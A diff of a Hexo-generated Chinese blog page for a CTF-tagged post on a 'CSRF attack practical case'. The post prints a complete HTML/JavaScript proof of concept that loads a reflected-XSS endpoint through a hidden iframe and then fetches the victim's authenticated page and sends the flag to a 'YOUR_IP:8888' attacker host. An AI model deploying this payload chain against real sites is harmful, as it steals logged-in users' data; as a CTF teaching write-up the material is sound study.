@@ -4,18 +4,22 @@
   <meta charset="utf-8">
   
   
-  <title>Hexo</title>
+  <title>CSRF攻击实战案例 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="未命名示例恶意页面下面是一份示例代码，展示了如何利用 CSRF 触发反射型 XSS，然后 fetch() 页面获取 flag 内容并发送到攻击者服务器： 12345678910111213141516171819202122232425262728293031323334&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;  &lt;meta charset&#x3D;">
+  <meta name="description" content="CSRF攻击实战案例下面是一份示例代码，展示了如何利用 CSRF 触发反射型 XSS，然后 fetch() 页面获取 flag 内容并发送到攻击者服务器： 12345678910111213141516171819202122232425262728293031323334&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;  &lt;meta charset">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/2025/05/20/CSRF/%E6%9C%AA%E5%91%BD%E5%90%8D/index.html">
+<meta property="og:title" content="CSRF攻击实战案例">
+<meta property="og:url" content="http://example.com/2025/05/20/CSRF/CSRF%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="未命名示例恶意页面下面是一份示例代码，展示了如何利用 CSRF 触发反射型 XSS，然后 fetch() 页面获取 flag 内容并发送到攻击者服务器： 12345678910111213141516171819202122232425262728293031323334&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;  &lt;meta charset&#x3D;">
+<meta property="og:description" content="CSRF攻击实战案例下面是一份示例代码，展示了如何利用 CSRF 触发反射型 XSS，然后 fetch() 页面获取 flag 内容并发送到攻击者服务器： 12345678910111213141516171819202122232425262728293031323334&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;  &lt;meta charset">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2025-05-19T22:19:20.000Z">
-<meta property="article:modified_time" content="2025-05-19T22:19:20.000Z">
+<meta property="article:published_time" content="2025-05-20T06:28:00.000Z">
+<meta property="article:modified_time" content="2025-05-20T06:29:11.404Z">
 <meta property="article:author" content="John Doe">
+<meta property="article:tag" content="安全">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="CSRF">
+<meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
@@ -73,19 +77,33 @@
 </header>
 
       <div class="outer">
-        <section id="main"><article id="post-CSRF/未命名" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+        <section id="main"><article id="post-CSRF/CSRF攻击实战案例" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2025/05/20/CSRF/%E6%9C%AA%E5%91%BD%E5%90%8D/" class="article-date">
-  <time class="dt-published" datetime="2025-05-19T22:19:20.000Z" itemprop="datePublished">2025-05-20</time>
+    <a href="/2025/05/20/CSRF/CSRF%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T06:28:00.000Z" itemprop="datePublished">2025-05-20</time>
 </a>
     
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>►<a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B/">实战案例</a>
+  </div>
+
   </div>
   <div class="article-inner">
     
     
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      CSRF攻击实战案例
+    </h1>
+  
+
+      </header>
+    
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="未命名"><a href="#未命名" class="headerlink" title="未命名"></a>未命名</h1><h4 id="示例恶意页面"><a href="#示例恶意页面" class="headerlink" title="示例恶意页面"></a><strong>示例恶意页面</strong></h4><p>下面是一份示例代码，展示了如何利用 CSRF 触发反射型 XSS，然后 fetch() 页面获取 flag 内容并发送到攻击者服务器：</p>
+        <h1 id="CSRF攻击实战案例"><a href="#CSRF攻击实战案例" class="headerlink" title="CSRF攻击实战案例"></a>CSRF攻击实战案例</h1><p>下面是一份示例代码，展示了如何利用 CSRF 触发反射型 XSS，然后 fetch() 页面获取 flag 内容并发送到攻击者服务器：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF-to-XSS Exfiltration<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Triggering CSRF-to-XSS Attack<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Construct the XSS payload. Dynamically split the closing tag to avoid premature termination.</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> payload = <span class="string">`&lt;scr`</span> + <span class="string">`ipt&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">      // Use fetch() to retrieve the homepage which includes the flag (after admin&#x27;s draft is published)</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">      fetch(&quot;http://challenge.localhost/&quot;, &#123; credentials: &quot;include&quot; &#125;)</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        .then(response =&gt; response.text())</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        .then(data =&gt; &#123;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">          // Exfiltrate the data to the attacker&#x27;s server. Replace YOUR_IP:8888 with your attacker&#x27;s address.</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">          var exfilUrl = &quot;http://YOUR_IP:8888/?flag=&quot; + encodeURIComponent(data);</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">          new Image().src = exfilUrl;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        &#125;)</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        .catch(error =&gt; console.error(&quot;Fetch error:&quot;, error));</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">    &lt;/scr`</span> + <span class="string">`ipt&gt;`</span>;</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// URL-encode the payload so it can be safely passed as a parameter</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> encodedPayload = <span class="built_in">encodeURIComponent</span>(payload);</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Build the target URL using the /ephemeral endpoint which reflects the msg parameter</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> targetUrl = <span class="string">&quot;http://challenge.localhost/ephemeral?msg=&quot;</span> + encodedPayload;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Create an invisible iframe to force admin&#x27;s browser to load the target URL and execute our payload</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;iframe&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    iframe.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;none&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    iframe.<span class="property">src</span> = targetUrl;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(iframe);</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p><strong>部署步骤：</strong></p>
@@ -166,25 +184,23 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/CSRF/%E6%9C%AA%E5%91%BD%E5%90%8D/" data-id="cmaw4l7yl0000307khezh5upw" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/CSRF/CSRF%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B/" data-id="cmaw4w3qp0000zg7kfboree91" data-title="CSRF攻击实战案例" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CSRF/" rel="tag">CSRF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li></ul>
+
     </footer>
   </div>
   
     
 <nav id="article-nav">
   
-    <a href="/2025/05/20/hello-world/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          Hello World
-        
-      </div>
-    </a>
   
+    <a href="/2025/05/20/CSRF/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">CSRF攻击详解</div>
+    </a>
   
 </nav>
 
@@ -197,12 +213,33 @@
           <aside id="sidebar">
   
     
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B/">实战案例</a></li></ul></li></ul>
+    </div>
+  </div>
+
 
   
     
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSRF/" rel="tag">CSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/" rel="tag">跨站请求伪造</a></li></ul>
+    </div>
+  </div>
+
 
   
     
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CSRF/" style="font-size: 20px;">CSRF</a> <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 20px;">Web安全</a> <a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 20px;">安全</a> <a href="/tags/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/" style="font-size: 10px;">跨站请求伪造</a>
+    </div>
+  </div>
+
   
     
   <div class="widget-wrap">
@@ -221,11 +258,15 @@
       <ul>
         
           <li>
-            <a href="/2025/05/20/hello-world/">Hello World</a>
+            <a href="/2025/05/20/CSRF/CSRF%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B/">CSRF攻击实战案例</a>
           </li>
         
           <li>
-            <a href="/2025/05/20/CSRF/%E6%9C%AA%E5%91%BD%E5%90%8D/">(no title)</a>
+            <a href="/2025/05/20/CSRF/">CSRF攻击详解</a>
+          </li>
+        
+          <li>
+            <a href="/2025/05/20/hello-world/">Hello World</a>
           </li>
         
       </ul>
